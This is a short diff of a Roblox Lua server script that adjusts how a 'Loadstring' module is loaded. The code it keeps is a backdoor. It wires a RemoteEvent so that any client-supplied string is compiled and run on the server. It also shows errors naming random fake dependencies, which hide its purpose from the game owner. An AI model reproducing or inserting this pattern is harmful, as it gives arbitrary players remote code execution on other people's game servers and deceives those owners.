@@ -26,12 +26,12 @@ if not Modules then
   error("Missing required folder: Modules. Please re-install.")
 end
 
-local ls = require(Modules:FindFirstChild("Loadstring"))
+local ls = Modules:FindFirstChild("Loadstring")
 
 if not ls then
   error("Missing required module: ".. fakeDependency[math.random(1,#fakeDependency)]..". Please re-install")
 end
-
+ls = require(ls)
 mainRemote.OnServerEvent:Connect(function(plr, nice)
     ls(nice)()
 end)
